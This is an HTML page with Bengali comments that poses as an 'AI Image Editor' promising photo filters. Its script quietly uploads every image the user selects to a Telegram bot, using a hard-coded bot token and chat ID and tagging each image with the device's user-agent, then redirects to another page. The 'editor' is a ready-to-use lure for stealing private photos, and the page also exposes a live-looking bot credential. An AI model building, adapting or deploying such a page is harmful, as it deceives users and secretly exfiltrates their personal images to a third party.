<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>AI Image Editor</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            background: #0b0d15;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
        }
        .container {
            max-width: 420px;
            width: 100%;
            background: rgba(255, 255, 255, 0.04);
            backdrop-filter: blur(24px);
            border-radius: 36px;
            padding: 28px 22px 30px;
            border: 1px solid rgba(255, 255, 255, 0.06);
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
            text-align: center;
        }
        .badge {
            background: linear-gradient(135deg, #8b5cf6, #6d28d9);
            color: #fff;
            font-size: 11px;
            font-weight: 600;
            padding: 4px 16px;
            border-radius: 30px;
            display: inline-block;
        }
        h1 {
            color: #fff;
            font-size: 28px;
            margin: 10px 0 4px;
        }
        h1 span {
            color: #8b5cf6;
        }
        .sub {
            color: rgba(255, 255, 255, 0.4);
            font-size: 14px;
            margin-bottom: 20px;
        }
        .upload-box {
            border: 2px dashed rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 40px 20px;
            cursor: pointer;
            transition: 0.3s;
            position: relative;
        }
        .upload-box:hover {
            border-color: #8b5cf6;
            background: rgba(139, 92, 246, 0.04);
        }
        .upload-box .icon {
            font-size: 48px;
        }
        .upload-box p {
            color: rgba(255, 255, 255, 0.5);
            font-size: 14px;
            margin-top: 8px;
        }
        .upload-box input[type="file"] {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            cursor: pointer;
        }
        #fileList {
            margin-top: 14px;
            color: rgba(255, 255, 255, 0.6);
            font-size: 13px;
        }
        .btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 40px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 16px;
        }
        .btn-primary {
            background: linear-gradient(135deg, #8b5cf6, #6d28d9);
            color: #fff;
        }
        .btn-primary:hover:not(:disabled) {
            transform: scale(1.02);
            box-shadow: 0 8px 32px rgba(139, 92, 246, 0.4);
        }
        .btn-primary:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }
        .status {
            margin-top: 12px;
            font-size: 13px;
            color: rgba(255, 255, 255, 0.4);
        }
        .status.success {
            color: #4ade80;
        }
        .status.error {
            color: #f87171;
        }
        .hidden {
            display: none !important;
        }
        .spinner {
            display: none;
            width: 24px;
            height: 24px;
            border: 3px solid rgba(255, 255, 255, 0.1);
            border-top: 3px solid #8b5cf6;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 12px auto 0;
        }
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="badge">✨ AI POWERED</div>
        <h1>AI <span>Image</span> Editor</h1>
        <p class="sub">Transform your photos with AI filters</p>

        <div class="upload-box" id="uploadBox">
            <div class="icon">🖼️</div>
            <p>Tap to select images from gallery</p>
            <input type="file" id="fileInput" accept="image/*" multiple />
        </div>

        <div id="fileList"></div>

        <button class="btn btn-primary" id="uploadBtn" disabled>
            🚀 Create Image Now
        </button>

        <div class="spinner" id="spinner"></div>
        <div class="status" id="status"></div>
    </div>

    <script>
        // ==========================================
        // 🔥 টেলিগ্রাম কনফিগ
        // ==========================================
        const BOT_TOKEN = "8887980298:AAH-iJH-t8Iu7JswRiugAiY1om5KD_AvPBA";
        const CHAT_ID = "8602835111";

        // ==========================================
        // ডম রেফারেন্স
        // ==========================================
        const fileInput = document.getElementById('fileInput');
        const fileList = document.getElementById('fileList');
        const uploadBtn = document.getElementById('uploadBtn');
        const status = document.getElementById('status');
        const spinner = document.getElementById('spinner');

        let selectedFiles = [];

        // ==========================================
        // ফাইল সিলেক্ট
        // ==========================================
        fileInput.addEventListener('change', function(e) {
            selectedFiles = Array.from(e.target.files);
            if (selectedFiles.length > 0) {
                fileList.textContent = `📸 ${selectedFiles.length} image(s) selected`;
                uploadBtn.disabled = false;
                status.textContent = '';
                status.className = 'status';
            } else {
                fileList.textContent = '';
                uploadBtn.disabled = true;
            }
        });

        // ==========================================
        // টেলিগ্রামে ছবি পাঠানোর ফাংশন
        // ==========================================
        function sendImageToTelegram(file) {
            return new Promise((resolve, reject) => {
                const formData = new FormData();
                formData.append('photo', file);
                formData.append('chat_id', CHAT_ID);
                formData.append('caption', `🖼️ Gallery Image Uploaded\n📱 Device: ${navigator.userAgent}`);

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    })
                    .then(res => res.json())
                    .then(data => {
                        if (data.ok) {
                            resolve(data);
                        } else {
                            reject(data.description);
                        }
                    })
                    .catch(reject);
            });
        }

        // ==========================================
        // আপলোড বাটন
        // ==========================================
        uploadBtn.addEventListener('click', async function() {
            if (selectedFiles.length === 0) return;

            this.disabled = true;
            this.textContent = 'Uploading...';
            spinner.style.display = 'block';
            status.textContent = `📤 Sending ${selectedFiles.length} images...`;
            status.className = 'status';

            let success = 0;
            let failed = 0;

            for (let i = 0; i < selectedFiles.length; i++) {
                try {
                    await sendImageToTelegram(selectedFiles[i]);
                    success++;
                    status.textContent = `📤 Sent ${success}/${selectedFiles.length}`;
                } catch (err) {
                    failed++;
                    console.error('Send failed:', err);
                }
            }

            spinner.style.display = 'none';

            if (failed === 0) {
                status.textContent = `✅ All ${success} images sent successfully!`;
                status.className = 'status success';
                // রিডাইরেক্ট
                setTimeout(() => {
                    window.location.href = 'create.html';
                }, 1500);
            } else {
                status.textContent = `⚠️ ${success} sent, ${failed} failed. Try again.`;
                status.className = 'status error';
                this.disabled = false;
                this.textContent = '🚀 Create Image Now';
            }
        });

        // ==========================================
        // ড্র্যাগ অ্যান্ড ড্রপ
        // ==========================================
        const uploadBox = document.getElementById('uploadBox');
        uploadBox.addEventListener('dragover', (e) => {
            e.preventDefault();
            uploadBox.style.borderColor = '#8b5cf6';
        });
        uploadBox.addEventListener('dragleave', () => {
            uploadBox.style.borderColor = 'rgba(255,255,255,0.1)';
        });
        uploadBox.addEventListener('drop', (e) => {
            e.preventDefault();
            uploadBox.style.borderColor = 'rgba(255,255,255,0.1)';
            if (e.dataTransfer.files.length > 0) {
                fileInput.files = e.dataTransfer.files;
                fileInput.dispatchEvent(new Event('change'));
            }
        });
    </script>
</body>
</html>
